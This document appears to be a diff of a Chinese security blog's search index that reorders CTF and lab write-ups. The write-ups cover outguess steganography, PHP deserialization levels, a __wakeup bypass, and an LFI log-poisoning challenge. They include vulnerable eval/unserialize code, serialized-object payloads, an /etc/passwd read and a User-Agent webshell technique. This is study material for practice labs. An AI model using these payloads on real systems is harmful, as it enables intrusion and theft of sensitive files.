-    <url>/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>outguess下载安装</p>
-<p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%B3%E9%94%AE%E7%A9%BA%E7%99%BD%E5%A4%84%E9%80%89%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4./configure">https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure</a> &amp;&amp; make &amp;&amp; make install进行安装。</p>
-<span id="more"></span>
-
-<p>使用outguess</p>
-<p>输入outguess -help即可获得相关命令。</p>
-<p>加密：</p>
-<p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p>
-<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p>
-<p>解密：</p>
-<p>outguess -k “my secret key” -r out.jpg hidden.txt</p>
-<p>解密之后，紧密内容放在hidden.txt中</p>
-]]></content>
-      <categories>
-        <category>ctf工具</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php-SER-libs反序列化靶场</title>
-    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>构造类的实例化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
-<p>也就是uesr=daydream   pass=ok</p>
-<p>构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
-<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php中四个可文件包含的函数</title>
     <url>/2023/01/07/php%E4%B8%AD%E5%9B%9B%E4%B8%AA%E5%8F%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="一、文件包含漏洞分类"><a href="#一、文件包含漏洞分类" class="headerlink" title="一、文件包含漏洞分类"></a>一、文件包含漏洞分类</h1><p>LFI(Local File Inclusion)<br><strong>本地文件包含漏洞</strong>，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。<br>为了方便本文把LFI直接称为文件包含漏洞。</p>
@@ -1034,6 +1003,37 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php-SER-libs反序列化靶场</title>
+    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>构造类的实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
+<p>也就是uesr=daydream   pass=ok</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
+<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1165,21 +1165,6 @@ print(serialize($name));
       </tags>
   </entry>
   <entry>
-    <title>windows与linux敏感文件</title>
-    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn</title>
     <url>/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/</url>
     <content><![CDATA[<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711680046-9b221109-2797-4f54-b053-1be9a4ffe473.png" alt="img"></p>
@@ -1243,6 +1228,21 @@ https://blog.csdn.net/weixin_39190897/article/details/86772765
 https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       <categories>
         <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows与linux敏感文件</title>
+    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1829,24 +1829,24 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>(目录穿越)HNCTF中的一道题</title>
-    <url>/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
-    <content><![CDATA[<p>[WEEK2]easy_include</p>
-<p>​      这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。</p>
-<p>注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。</p>
-<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
+    <title>(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup</title>
+    <url>/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function __wakeup()&#123;             	//_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072737521-06c907d2-9a64-4886-a93e-43a6bc19c3cc.png" alt="img"></p>
-<p>构造payload：     ?file=/etc/passwd  可以访问内网文件</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072775580-591516be-aa57-4813-b4d8-45683350f308.png" alt="img"></p>
-<p>nginx的日志文件为/var/log/nginx/access.log</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072964901-350e88e1-12d2-4dd5-bc82-c5dd5dcdffe9.png" alt="img"></p>
-<p>构造UA头一句话木马</p>
-<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668073159817-8b29b857-b91b-40a0-b40d-c5ecde48c1d3.png" alt="img"></p>
+<p>在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
+<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$aa=new HaHaHa();</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;</span><br><span class="line">$aa-&gt;passwd=&quot;wllm&quot;;</span><br><span class="line">$stus=serialize($aa);</span><br><span class="line">print_r($stus);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072021557-69d0075f-fe21-47ff-865f-e01fc6d01c89.png" alt="img"></p>
+<p>将序列化得到的          O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
+<p>改为               O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
+<p>即可绕过__wakeup</p>
+<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072102334-c745feff-7182-4544-9f3c-9ea5dd1ac934.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>文件包含</category>
+        <category>反序列化</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1886,24 +1886,24 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup</title>
-    <url>/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function __wakeup()&#123;             	//_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+    <title>(目录穿越)HNCTF中的一道题</title>
+    <url>/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
+    <content><![CDATA[<p>[WEEK2]easy_include</p>
+<p>​      这个题直接包含日志，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行。</p>
+<p>注意一个问题就是，每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。</p>
+<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将你的一句话木马写入access.log日志，第二次发包才包含到前一次的日志中的木马。</p>
 <span id="more"></span>
 
-<p>在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p>
-<p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$aa=new HaHaHa();</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;</span><br><span class="line">$aa-&gt;passwd=&quot;wllm&quot;;</span><br><span class="line">$stus=serialize($aa);</span><br><span class="line">print_r($stus);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072021557-69d0075f-fe21-47ff-865f-e01fc6d01c89.png" alt="img"></p>
-<p>将序列化得到的          O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
-<p>改为               O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
-<p>即可绕过__wakeup</p>
-<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072102334-c745feff-7182-4544-9f3c-9ea5dd1ac934.png" alt="img"></p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072737521-06c907d2-9a64-4886-a93e-43a6bc19c3cc.png" alt="img"></p>
+<p>构造payload：     ?file=/etc/passwd  可以访问内网文件</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072775580-591516be-aa57-4813-b4d8-45683350f308.png" alt="img"></p>
+<p>nginx的日志文件为/var/log/nginx/access.log</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668072964901-350e88e1-12d2-4dd5-bc82-c5dd5dcdffe9.png" alt="img"></p>
+<p>构造UA头一句话木马</p>
+<p><img src="/2023/01/07/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A-HNCTF%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/1668073159817-8b29b857-b91b-40a0-b40d-c5ecde48c1d3.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>反序列化</category>
+        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -2139,6 +2139,29 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
